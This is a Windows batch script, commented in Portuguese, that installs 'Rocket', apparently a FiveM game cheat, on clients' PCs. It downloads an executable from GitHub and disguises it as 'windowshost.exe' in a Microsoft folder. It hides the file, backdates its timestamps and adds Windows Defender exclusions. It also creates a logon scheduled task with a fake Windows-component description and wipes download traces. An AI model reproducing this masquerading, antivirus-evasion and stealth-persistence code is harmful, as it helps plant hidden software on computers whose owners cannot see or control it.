@echo off
:: ========================================
::  INSTALADOR AUTOMATICO ROCKET
::  Versao Final - Simples, Seguro e Eficaz
::  Para instalar nos PCs dos clientes
:: ========================================

title Instalador Rocket - Versao Final
color 0A

:: Verificar Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Execute como Administrador!
    echo.
    echo Clique com botao direito e selecione "Executar como administrador"
    pause
    exit /b 1
)

:: Configuracoes
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "EXE_NAME=windowshost.exe"
set "INSTALL_PATH=%INSTALL_DIR%\%EXE_NAME%"
set "TASK_NAME=Microsoft\Windows\WindowsApps"

echo.
echo ========================================
echo    INSTALADOR ROCKET - VERSAO FINAL
echo ========================================
echo.

:: ========================================
:: PASSO 1: LIMPEZA COMPLETA
:: ========================================
echo [1/5] Limpando instalacoes antigas...

taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
taskkill /f /im rkt.exe >nul 2>&1
timeout /t 2 /nobreak >nul

schtasks /end /tn "%TASK_NAME%" >nul 2>&1
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\WindowsApps\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost" /f >nul 2>&1
schtasks /delete /tn "Rocket" /f >nul 2>&1
schtasks /delete /tn "ZERO" /f >nul 2>&1

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue | Out-Null; Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null"
timeout /t 2 /nobreak >nul

if exist "%INSTALL_PATH%" (
    attrib -s -h "%INSTALL_PATH%" >nul 2>&1
    del /q /f "%INSTALL_PATH%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

certutil -urlcache * delete >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1
del /q /f "%TEMP%\*rocket*" >nul 2>&1

echo [OK] Limpeza concluida!
echo.

:: ========================================
:: PASSO 2: VERIFICAR ROCKET.EXE NO GITHUB
:: ========================================
echo [2/5] Verificando Rocket.exe no GitHub...
powershell -ExecutionPolicy Bypass -Command "try { $response = Invoke-WebRequest -Uri '%GITHUB_URL%' -UseBasicParsing -Method Head -TimeoutSec 20 -ErrorAction Stop; Write-Host '[OK] Rocket.exe encontrado no GitHub!' -ForegroundColor Green; exit 0 } catch { Write-Host '[ERRO] Rocket.exe NAO existe no GitHub!' -ForegroundColor Red; Write-Host ''; Write-Host 'URL: %GITHUB_URL%' -ForegroundColor Yellow; Write-Host 'Erro: ' $_.Exception.Message -ForegroundColor Yellow; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    echo [ERRO] Rocket.exe nao esta disponivel no GitHub!
    echo.
    echo Por favor, compile e suba o Rocket.exe para o GitHub antes de instalar.
    pause
    exit /b 1
)
echo.

:: ========================================
:: PASSO 3: BAIXAR E INSTALAR
:: ========================================
echo [3/5] Baixando Rocket.exe do GitHub...

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

powershell -ExecutionPolicy Bypass -Command "$url='%GITHUB_URL%'; $out='%INSTALL_PATH%'; try { $ProgressPreference='SilentlyContinue'; Write-Host '     Baixando...' -NoNewline; $response=Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; Start-Sleep -Milliseconds 1000; if (Test-Path $out) { $file=Get-Item $out; $size=$file.Length; if ($size -gt 1000) { Write-Host ' [OK]' -ForegroundColor Green; Write-Host '[OK] Download concluido! Tamanho: ' $size ' bytes' -ForegroundColor Green; exit 0 } else { Write-Host ' [ERRO] Arquivo muito pequeno!' -ForegroundColor Red; Remove-Item $out -Force -ErrorAction SilentlyContinue; exit 1 } } else { Write-Host ' [ERRO] Arquivo nao criado!' -ForegroundColor Red; exit 1 } } catch { Write-Host ' [ERRO]' -ForegroundColor Red; Write-Host '[ERRO] Falha no download!' -ForegroundColor Red; Write-Host 'Erro: ' $_.Exception.Message -ForegroundColor Yellow; if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    echo [ERRO] Falha no download!
    pause
    exit /b 1
)

if not exist "%INSTALL_PATH%" (
    echo [ERRO] Arquivo nao foi baixado!
    pause
    exit /b 1
)
echo.

:: ========================================
:: PASSO 4: CONFIGURAR ARQUIVO
:: ========================================
echo [4/5] Configurando arquivo e protecoes...

attrib +s +h "%INSTALL_PATH%" >nul 2>&1

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%INSTALL_PATH%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $file.LastWriteTime=(Get-Date).AddYears(-2); $file.CreationTime=(Get-Date).AddYears(-2); Add-MpPreference -ExclusionPath $f -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } } catch { }"

echo [OK] Arquivo configurado e protegido!
echo.

:: ========================================
:: PASSO 5: CRIAR TAREFA AGENDADA
:: ========================================
echo [5/5] Criando tarefa agendada...

timeout /t 2 /nobreak >nul

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action=New-ScheduledTaskAction -Execute '%INSTALL_PATH%'; $trigger=New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay='PT30S'; $principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false); Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force | Out-Null"

timeout /t 2 /nobreak >nul
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Tarefa agendada criada com sucesso!
) else (
    echo [AVISO] Tentando metodo alternativo...
    schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /delay 0030 /f >nul 2>&1
    if %errorLevel% equ 0 (
        echo [OK] Tarefa criada via metodo alternativo!
    ) else (
        echo [ERRO] Falha ao criar tarefa agendada!
        echo [INFO] Execute CRIAR_TAREFA.bat manualmente.
    )
)
echo.

:: ========================================
:: LIMPEZA FINAL
:: ========================================
certutil -urlcache * delete >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1

:: ========================================
:: CONCLUSÃO
:: ========================================
echo ========================================
echo    INSTALACAO CONCLUIDA!
echo ========================================
echo.
echo [OK] Rocket.exe instalado em:
echo     %INSTALL_PATH%
echo.
echo [OK] Tarefa agendada criada
echo [OK] O Rocket sera executado 30 segundos
echo      apos o proximo logon
echo.
echo [INFO] IMPORTANTE:
echo    - Reinicie o PC para a tarefa funcionar
echo    - Apos reiniciar, aguarde 30 segundos
echo    - Abra Spotify e toque "Ghard - Pinheiros"
echo    - Abra o FiveM
echo    - Pressione INSERT para abrir/fechar o menu
echo.
echo [OK] Voce pode fechar esta janela.
echo.
timeout /t 3 /nobreak >nul
exit
